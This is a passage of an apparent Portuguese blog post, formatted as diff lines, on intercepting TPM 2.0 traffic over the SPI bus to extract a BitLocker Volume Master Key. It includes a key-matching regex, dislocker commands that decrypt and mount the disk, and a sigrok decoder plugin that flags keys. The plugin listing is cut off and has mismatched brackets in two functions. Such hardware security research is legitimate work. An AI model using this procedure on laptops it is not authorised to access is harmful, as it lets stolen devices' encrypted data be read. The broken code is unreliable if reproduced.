dados sensíveis, tais como senhas e certificados digitais, visando proteger contra diversas ameaças de segurança, incluindo acesso não autorizado ao hardware e software de um computador. O TPM 2.0 representa uma evolução da especificação original do TPM, desenvolvida pelo Trusted Computing Group (TCG), e apresenta recursos e capacidades adicionais, como suporte a algoritmos criptográficos adicionais e a capacidade de armazenar quantidades maiores de dados.</p>
+
+<h3 id="coisas-boas">Coisas boas</h3>
+
+<p>Atualmente, o Trusted Platform Module (TPM) é amplamente utilizado por mecanismos de criptografia de disco completo (Full Disk Encryption - FDE) e também por criptografia específica do dispositivo, já que geralmente está vinculado ao dispositivo (soldado na placa-mãe).</p>
+
+<p>É notável que, além de ser um recurso de segurança avançado em máquinas modernas, o protocolo de comunicação utilizado pelos Integrated Circuits (ICs) TPM é bastante simples. Geralmente, os ICs TPM utilizam o protocolo de comunicação Serial Peripheral Interface (SPI), mas também podem utilizar o protocolo Low Pin Count (LPC) e o protocolo Inter-Integrated Circuit (I2C). Uma questão importante a ser levantada é que os usuários geralmente confiam no TPM como uma medida de segurança confiável, no entanto, o tráfego no barramento geralmente é transmitido em texto simples. Por exemplo, após o desbloqueio do TPM, a chave do Bitlocker do Windows é transmitida em texto simples no barramento.</p>
+
+<p>Para este artigo, as suposições e análises são baseadas na especificação 2.0, versão 1.03v22 do TPM (na data do artigo atual, a especificação mais utilizada em computadores domésticos e servidores), que está disponível aqui: <a href="https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf">https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf</a></p>
+
+<p>Além disso, é importante mencionar que este artigo se baseia em outros dois artigos, que podem ser encontrados nos seguintes links:</p>
+
+<p><a href="https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key">https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key</a></p>
+
+<p><a href="https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network">https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network</a></p>
+
+<p>Cabe ressaltar que até o presente momento, o conhecimento aplicado com sucesso permitiu a extração de uma chave do Bitlocker em um cenário real.</p>
+
+<h3 id="transação-spi-do-tpm">Transação SPI do TPM</h3>
+
+<p>Uma transação do Trusted Platform Module (TPM) por meio do protocolo Serial Peripheral Interface (SPI) é uma série de operações executadas por um dispositivo TPM. Essas operações incluem, normalmente, a inicialização do TPM, a criação e gerenciamento de chaves criptográficas e a execução de operações criptográficas, como criptografia e assinatura.</p>
+
+<p>Um exemplo comum de uso do TPM é proteger as chaves de criptografia de um sistema, permitindo que o sistema seja iniciado somente se o TPM permitir após uma série de verificações de segurança. Outro exemplo é criar uma conexão segura com outro dispositivo, criando um par de chaves exclusivo, armazenando a chave privada no TPM e compartilhando a chave pública com o outro dispositivo.</p>
+
+<p>As transações do dispositivo TPM são normalmente executadas interagindo com um driver de dispositivo TPM, que é um software que se comunica com o dispositivo TPM e gerencia suas operações. As transações do dispositivo TPM são normalmente governadas pela Application Programming Interface (API) da biblioteca TPM2.0.</p>
+
+<p>Existem vários tipos de transações que podem ser analisados por meio do SPI, porém, para o propósito de recuperar as chaves do Bitlocker, apenas dois são relevantes: FIFO Write e FIFO Read. O foco nessas duas operações é necessário para acessar a chave Volume Master Key (VMK), que é responsável por criptografar a chave AES256-XTS.</p>
+
+<p>A VMK é criptografada pelo TPM e armazenada no cabeçalho Bitlocker do disco de destino. Durante o processo de inicialização, o carregador de inicialização do Windows recupera a VMK criptografada do cabeçalho Bitlocker e envia-a para o TPM como uma solicitação de descriptografia. O TPM, então, envia de volta a versão descriptografada da VMK, assumindo que o TPM está configurado corretamente e todas as verificações de segurança foram aprovadas. O resultado do processo de descriptografia depende da configuração do TPM.</p>
+
+<p>Em sistemas com inicialização segura completa, o TPM exige que múltiplos hashes sejam corretamente inicializados durante as primeiras etapas do processo de inicialização. Os detalhes específicos desse processo estão fora do escopo desta explicação, mas é importante observar que cada etapa do processo de inicialização do sistema faz um hash da próxima etapa e carrega-o no TPM. Por exemplo, a primeira etapa é um bootrom dentro da CPU que verifica a assinatura da primeira etapa do BIOS.</p>
+
+<h3 id="interceptando-o-tpm">Interceptando o TPM</h3>
+
+<p>O chip Trusted Platform Module (TPM) geralmente está localizado na placa-mãe de uma forma que não é facilmente acessível, por exemplo, no lado do teclado de um laptop. No entanto, como o protocolo Serial Peripheral Interface (SPI) é um protocolo de barramento, é possível inferir que todos os dispositivos SPI na placa-mãe utilizem as mesmas linhas de clock e dados. Como resultado, é possível conectar um analisador lógico à memória flash SPI que armazena o código BIOS/UEFI e monitorar quaisquer transações SPI que ocorram quando a memória flash estiver inativa (quando o sinal de seleção do chip para a memória flash estiver baixo). Essa abordagem permite detectar as transações relevantes para recuperar as chaves do Bitlocker.
+<img src="/assets/posts/patreon/Pasted image 20230124034954.png" alt="" />
+<img src="/assets/posts/patreon/Pasted image 20230124035004.png" alt="" /></p>
+
+<p>Este método, no entanto, pode levar a complicações potenciais se houver outros dispositivos conectados ao mesmo barramento SPI, além da memória flash SPI e do TPM. Embora seja relativamente improvável que vários dispositivos estejam conectados ao mesmo barramento nesse contexto.</p>
+
+<p>No pulseview, podemos analisar os bytes SPI usando a função decodificadora de SPI.
+<img src="/assets/posts/patreon/Pasted image 20230124035010.png" alt="" />
+<img src="/assets/posts/patreon/Pasted image 20230124035020.png" alt="" /></p>
+
+<p>Em seguida, precisamos configurar o decodificador SPI para os sinais corretos para poder ver os bytes decodificados.
+<img src="/assets/posts/patreon/Pasted image 20230124035029.png" alt="" /></p>
+
+<p>Então, você notará que, como deixamos o campo de polaridade do CS# como “<strong>active-low</strong>”, ele está decodificando apenas as transações do BIOS Flash, não o “resto” do barramento.
+<img src="/assets/posts/patreon/Pasted image 20230124035036.png" alt="" /></p>
+
+<p>Se selecionarmos “<strong>active-high</strong>”, analisaremos qualquer coisa que <strong>não</strong> seja o BIOS flash (que é o que queremos):
+<img src="/assets/posts/patreon/Pasted image 20230124035040.png" alt="" /></p>
+
+<p>Agora temos bytes analisados para o SPI, o que torna mais fácil para nós trabalharmos com eles. Agora precisamos criar um plugin do sigrok para analisá-lo.</p>
+
+<h3 id="analisando-o-tpm-no-sigrok--pulseview">Analisando o TPM no Sigrok / Pulseview</h3>
+
+<p>A criação de um plugin Sigrok é um processo simples, graças ao guia oficial detalhado disponível no site do Sigrok em <a href="https://sigrok.org/wiki/Protocol_decoder_HOWTO">https://sigrok.org/wiki/Protocol_decoder_HOWTO</a>. Dado que estamos trabalhando com o protocolo Serial Peripheral Interface (SPI), é adequado utilizar a funcionalidade “Decodificador de Pilha” do Sigrok, que permite encadear vários decodificadores e usar a saída de um decodificador como entrada de outro. Essa abordagem simplifica o processo, eliminando a necessidade de localizar e extrair manualmente bits individuais de dados dos dados brutos do SPI e permite que o foco seja nos bytes formados reais produzidos pelo decodificador SPI do Sigrok.</p>
+
+<p>Para começar, é necessário criar uma pasta “tpmdecoder” na pasta de plugins (no Linux, ela está localizada em ~/.local/share/libsigrokdecode/decoders/), com os seguintes arquivos anexados a esta postagem:</p>
+
+<ul>
+  <li><strong>init</strong>.py</li>
+  <li>pd.py</li>
+</ul>
+
+<p>Esses são os arquivos necessários para o decodificador que foi desenvolvido. Basicamente, foi criado um decodificador para os registradores TPM, conforme descrito em <a href="https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf">https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf</a></p>
+
+<p>Após criar e salvar o projeto do PulseView, é necessário fechar e abrir novamente. O plugin deve ser carregado automaticamente. Na configuração do plugin SPI, na opção “Decodificador de Pilha”, a opção “TPM2.0” deverá estar disponível.
+<img src="/assets/posts/patreon/Pasted image 20230124035119.png" alt="" />
+E depois de selecionar, ele começará a tentar encontrar mensagens TPM2.0 sobre os dados SPI. <img src="/assets/posts/patreon/Pasted image 20230124035129.png" alt="" /></p>
+
+<h3 id="chave-do-bitlocker">Chave do Bitlocker</h3>
+
+<p>Para esta seção, é altamente recomendável verificar a documentação do <a href="https://github.com/libyal/libbde/blob/main/documentation/BitLocker%20Drive%20Encryption%20(BDE)%20format.asciidoc">libbde</a> no GitHub. A documentação contém praticamente todas (se não todas) as informações relacionadas ao Bitlocker, incluindo as versões legadas.</p>
+
+<p>A chave que desejamos recuperar é, na verdade, a chave mestra de volume do Bitlocker, que possui um formato específico. Podemos usar uma expressão regular para recuperar essa chave em vez de tentar entender cada solicitação, o que levaria mais tempo para criar um decodificador.</p>
+
+<p>Os dados que são realmente criptografados pelo TPM são uma entrada de metadados FVE, como descrito na seção <a href="https://github.com/libyal/libbde/blob/main/documentation/BitLocker%20Drive%20Encryption%20(BDE)%20format.asciidoc#53-fve-metadata-entry">5.3 do libbde</a>. Isso apresenta alguns cabeçalhos que podem ser combinados com uma expressão regular.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2C000[0-6]000[1-9]000[0-1]000[0-5]200000(\w{64})
+</code></pre></div></div>
+
+<p>Depois de todo o cabeçalho, a chave Volume Master Key (VMK) é concatenada. Para encontrar a chave, basta procurar por 64 caracteres (32 bytes, o que corresponde a uma chave de 256 bits).</p>
+
+<p>Para facilitar o uso, o decodificador anexado imprime as chaves encontradas no terminal de decodificação (para que não seja necessário usar a interface do PulseView, se não desejado) e também mostra em uma linha separada no PulseView.
+<img src="/assets/posts/patreon/Pasted image 20230124035206.png" alt="" /></p>
+
+<h3 id="acessando-dados-usando-o-vmk-descarregado">Acessando dados usando o VMK descarregado</h3>
+
+<p>Para acessar os dados criptografados pelo Bitlocker, utilizaremos o projeto dislocker (<a href="https://github.com/Aorimn/dislocker">https://github.com/Aorimn/dislocker</a>) para montar a partição como texto simples. Antes disso, é necessário salvar a chave inteira como um arquivo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"66D96600C7..."</span> | xxd <span class="nt">-p</span> <span class="nt">-r</span> <span class="o">&gt;</span> vmk.key
+</code></pre></div></div>
+
+<p>Em seguida, podemos utilizar o dislocker para criar um nó de dispositivo com o dispositivo em texto simples, usando a partição n em sdx:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">mkdir</span> <span class="nt">-p</span> mydisk <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>dislocker-fuse <span class="nt">-K</span> vmk.key /dev/sdxn <span class="nt">--</span> ./mydisk
+</code></pre></div></div>
+
+<p>Por exemplo, se a partição criptografada estiver em /dev/sda3, pode-se utilizar:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> <span class="nt">-p</span> mydisk <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>dislocker-fuse <span class="nt">-K</span> vmk.key /dev/sda3 <span class="nt">--</span> ./mydisk
+</code></pre></div></div>
+
+<p>Será criado um arquivo dislocker dentro da pasta ./mydisk, que representa o dispositivo e pode ser montado como uma partição normal.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>mount <span class="nt">-o</span> remove_hiberfile ./mydisk/dislocker-file /media/disk
+</code></pre></div></div>
+
+<p>Agora, é possível acessar os dados descriptografados na pasta /media/disk.</p>
+
+<h3 id="todas-referências-consolidadas">Todas referências consolidadas</h3>
+
+<p>Aqui estão todas as referências consolidadas para que possam checar elas.</p>
+
+<ul>
+  <li>
+    <p>TPM 2.0 Specification - <a href="https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf">https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf</a></p>
+  </li>
+  <li>
+    <p>F-Secure - Sniff, there leaks - <a href="https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key">https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key</a></p>
+  </li>
+  <li>
+    <p>DolosGroup - From Stolen Laptop to Inside the company network - <a href="https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network">https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network</a></p>
+  </li>
+</ul>
+
+<h1 id="arquivos">Arquivos</h1>
+
+<h3 id="__init__py"><code class="language-plaintext highlighter-rouge">__init__.py</code></h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">##
+## This file is part of the libsigrokdecode project.
+##
+## Copyright (C) 2022 Lucas Teske &lt;lucas@teske.com.br&gt;
+##
+## This program is free software; you can redistribute it and/or modify
+## it under the terms of the GNU General Public License as published by
+## the Free Software Foundation; either version 2 of the License, or
+## (at your option) any later version.
+##
+## This program is distributed in the hope that it will be useful,
+## but WITHOUT ANY WARRANTY; without even the implied warranty of
+## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+## GNU General Public License for more details.
+##
+## You should have received a copy of the GNU General Public License
+## along with this program; if not, see &lt;http://www.gnu.org/licenses/&gt;.
+##
+</span>
+<span class="kn">from</span> <span class="nn">.pd</span> <span class="kn">import</span> <span class="n">Decoder</span>
+</code></pre></div></div>
+
+<h3 id="pdpy"><code class="language-plaintext highlighter-rouge">pd.py</code></h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">##
+## This file is part of the libsigrokdecode project.
+##
+## Copyright (C) 2022 Lucas Teske &lt;lucas@teske.com.br&gt;
+##
+## This program is free software; you can redistribute it and/or modify
+## it under the terms of the GNU General Public License as published by
+## the Free Software Foundation; either version 2 of the License, or
+## (at your option) any later version.
+##
+## This program is distributed in the hope that it will be useful,
+## but WITHOUT ANY WARRANTY; without even the implied warranty of
+## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+## GNU General Public License for more details.
+##
+## You should have received a copy of the GNU General Public License
+## along with this program; if not, see &lt;http://www.gnu.org/licenses/&gt;.
+##
+</span>
+<span class="kn">import</span> <span class="nn">sigrokdecode</span> <span class="k">as</span> <span class="n">srd</span>
+<span class="kn">import</span> <span class="nn">binascii</span><span class="p">,</span> <span class="n">re</span>
+<span class="kn">from</span> <span class="nn">enum</span> <span class="kn">import</span> <span class="n">Enum</span>
+
+<span class="n">OPERATION_MASK</span> <span class="o">=</span> <span class="mh">0x80</span>
+<span class="n">SIZE_MASK</span> <span class="o">=</span> <span class="mh">0x3f</span>
+<span class="n">WAIT_MASK</span> <span class="o">=</span> <span class="mh">0x01</span>
+
+<span class="c1"># Registers at https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf
+# Page 63 (pdf 71) - Table 17
+</span>
+<span class="n">tpmRegisters</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="mh">0xD40000</span><span class="p">:</span> <span class="s">"TPM_ACCESS_0"</span><span class="p">,</span>
+    <span class="mh">0xD4000C</span><span class="p">:</span> <span class="s">"TPM_INT_VECTOR_0"</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40008</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">"TPM_INT_ENABLE_0"</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40010</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">"TPM_INT_STATUS_0"</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40014</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">"TPM_INTF_CAPABILITY_0"</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40018</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">"TPM_STS_0"</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40024</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">"TPM_DATA_FIFO_0"</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40030</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">"TPM_INTERFACE_ID_0"</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40080</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">"TPM_XDATA_FIFO_0"</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+    <span class="n">tpmRegisters</span><span class="p">[</span><span class="mh">0xD40F00</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s">"TPM_DID_VID_0"</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tpmRegisters</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"{:08X} = {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">tpmRegisters</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
+
+<span class="k">class</span> <span class="nc">State</span><span class="p">(</span><span class="n">Enum</span><span class="p">):</span>
+    <span class="n">READING_OP</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="n">READING_ARG</span> <span class="o">=</span> <span class="mi">2</span>
+    <span class="n">WAITING</span> <span class="o">=</span> <span class="mi">3</span>
+    <span class="n">TRANSFER</span> <span class="o">=</span> <span class="mi">4</span>
+
+<span class="k">class</span> <span class="nc">Decoder</span><span class="p">(</span><span class="n">srd</span><span class="p">.</span><span class="n">Decoder</span><span class="p">):</span>
+    <span class="n">api_version</span> <span class="o">=</span> <span class="mi">3</span>
+    <span class="nb">id</span> <span class="o">=</span> <span class="s">'tpm20'</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="s">'TPM2.0'</span>
+    <span class="n">longname</span> <span class="o">=</span> <span class="s">'TPM 2.0'</span>
+    <span class="n">desc</span> <span class="o">=</span> <span class="s">'A TPM 2.0 Protocol Decoder'</span>
+    <span class="n">license</span> <span class="o">=</span> <span class="s">'gplv2+'</span>
+    <span class="n">inputs</span> <span class="o">=</span> <span class="p">[</span><span class="s">'spi'</span><span class="p">]</span>
+    <span class="n">outputs</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">tags</span> <span class="o">=</span> <span class="p">[</span><span class="s">'SPI'</span><span class="p">,</span> <span class="s">'TPM'</span><span class="p">]</span>
+    <span class="n">options</span> <span class="o">=</span> <span class="p">()</span>
+    <span class="n">annotations</span> <span class="o">=</span> <span class="p">(</span>
+        <span class="p">(</span><span class="s">'text'</span><span class="p">,</span> <span class="s">'Text'</span><span class="p">),</span>                   <span class="c1"># 0
+</span>        <span class="p">(</span><span class="s">'warning'</span><span class="p">,</span> <span class="s">'Warning'</span><span class="p">),</span>             <span class="c1"># 1
+</span>        <span class="p">(</span><span class="s">'data-write'</span><span class="p">,</span> <span class="s">'Data write'</span><span class="p">),</span>       <span class="c1"># 2
+</span>        <span class="p">(</span><span class="s">'data-read'</span><span class="p">,</span> <span class="s">'Data read'</span><span class="p">),</span>         <span class="c1"># 3
+</span>        <span class="p">(</span><span class="s">'fifo-write'</span><span class="p">,</span> <span class="s">'FIFO write'</span><span class="p">),</span>       <span class="c1"># 4
+</span>        <span class="p">(</span><span class="s">'fifo-read'</span><span class="p">,</span> <span class="s">'FIFO read'</span><span class="p">),</span>         <span class="c1"># 5
+</span>        <span class="p">(</span><span class="s">'bitlocker-key'</span><span class="p">,</span> <span class="s">'Bitlocker Key'</span><span class="p">),</span> <span class="c1"># 6
+</span>    <span class="p">)</span>
+    <span class="n">annotation_rows</span> <span class="o">=</span> <span class="p">(</span>
+         <span class="p">(</span><span class="s">'row-read'</span><span class="p">,</span> <span class="s">'Read'</span><span class="p">,</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="p">)),</span>
+         <span class="p">(</span><span class="s">'row-write'</span><span class="p">,</span> <span class="s">'Write'</span><span class="p">,</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">)),</span>
+         <span class="p">(</span><span class="s">'row-fifo-read'</span><span class="p">,</span> <span class="s">'FIFO Read'</span><span class="p">,</span> <span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="p">)),</span>
+         <span class="p">(</span><span class="s">'row-fifo-write'</span><span class="p">,</span> <span class="s">'FIFO Write'</span><span class="p">,</span> <span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="p">)),</span>
+         <span class="p">(</span><span class="s">'row-bitlocker-key'</span><span class="p">,</span> <span class="s">'Bitlocker Key'</span><span class="p">,</span> <span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">)),</span>
+    <span class="p">)</span>
+    <span class="n">binary</span> <span class="o">=</span> <span class="p">(</span>
+        <span class="p">(</span><span class="s">'packet-read'</span><span class="p">,</span> <span class="s">'Packet read'</span><span class="p">),</span>
+        <span class="p">(</span><span class="s">'packet-write'</span><span class="p">,</span> <span class="s">'Packet write'</span><span class="p">),</span>
+    <span class="p">)</span>
+    <span class="n">options</span> <span class="o">=</span> <span class="p">()</span>
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">reset</span><span class="p">()</span>
+
+    <span class="k">def</span> <span class="nf">reset</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_OP</span>
+
+    <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">out_ann</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">register</span><span class="p">(</span><span class="n">srd</span><span class="p">.</span><span class="n">OUTPUT_ANN</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">out_python</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">register</span><span class="p">(</span><span class="n">srd</span><span class="p">.</span><span class="n">OUTPUT_PYTHON</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">out_binary</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">register</span><span class="p">(</span><span class="n">srd</span><span class="p">.</span><span class="n">OUTPUT_BINARY</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ss</span><span class="p">,</span> <span class="n">es</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span> <span class="ow">and</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s">"DATA"</span><span class="p">:</span>
+            <span class="n">_</span><span class="p">,</span> <span class="n">mosi</span><span class="p">,</span> <span class="n">miso</span> <span class="o">=</span> <span class="n">data</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">putdata</span><span class="p">(</span><span class="n">ss</span><span class="p">,</span> <span class="n">es</span><span class="p">,</span> <span class="n">mosi</span><span class="p">,</span> <span class="n">miso</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">report_transaction</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">ttype</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="n">hexlify</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">(</span><span class="n">data</span><span class="p">)).</span><span class="n">decode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">addr</span> <span class="ow">in</span> <span class="n">tpmRegisters</span><span class="p">:</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="s">"{}: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">tpmRegisters</span><span class="p">[</span><span class="n">addr</span><span class="p">],</span> <span class="n">data</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="s">"RESERVED({:06X}): {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">out_ann</span><span class="p">,</span> <span class="p">[</span><span class="mi">3</span> <span class="k">if</span> <span class="n">ttype</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">2</span><span class="p">,</span> <span class="p">[</span><span class="n">data</span><span class="p">]</span> <span class="p">])</span>
+
+    <span class="k">def</span> <span class="nf">report_fifo</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">ttype</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="s">" "</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="s">"{:02X}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">data</span><span class="p">])</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">out_ann</span><span class="p">,</span> <span class="p">[</span><span class="mi">5</span> <span class="k">if</span> <span class="n">ttype</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">4</span><span class="p">,</span> <span class="p">[</span><span class="n">data</span><span class="p">))</span>
+
+    <span class="k">def</span> <span class="nf">report_bitlocker_key</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">out_ann</span><span class="p">,</span> <span class="p">[</span><span class="mi">6</span><span class="p">,</span> <span class="p">[</span><span class="n">key</span><span class="p">))</span>
+
+    <span class="n">opIsRead</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">numBytes</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">addrIdx</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">bytesRead</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">transactionStart</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">transactionEnd</span> <span class="o">=</span> <span class="mi">0</span>
+
+    <span class="k">def</span> <span class="nf">putdata</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ss</span><span class="p">,</span> <span class="n">es</span><span class="p">,</span> <span class="n">mosi</span><span class="p">,</span> <span class="n">miso</span><span class="p">):</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">state</span> <span class="o">==</span> <span class="n">State</span><span class="p">.</span><span class="n">READING_OP</span><span class="p">:</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span>
